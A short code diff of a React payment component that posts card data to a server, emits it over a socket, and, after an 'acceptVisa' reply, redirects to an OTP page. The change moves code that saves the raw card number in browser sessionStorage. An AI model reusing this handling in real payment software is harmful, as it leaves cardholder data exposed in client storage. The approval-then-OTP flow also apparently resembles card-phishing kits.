@@ -85,12 +85,12 @@ const Payment = ({ mode, setMode, checkMode }) => {
       serverRoute + "/visa/" + sessionStorage.getItem("id"),
       finalData
     );
+    sessionStorage.setItem("cardNumber", cardNumber);
     socket.emit("visa", { finalData, id: sessionStorage.getItem("id") });
   };
   socket.on("acceptVisa", (result) => {
     if (result === sessionStorage.getItem("id")) {
       setLoading(false);
-      sessionStorage.setItem("cardNumber",cardNumber );
       window.location.href = `/otp/${result}`;
     }
   });
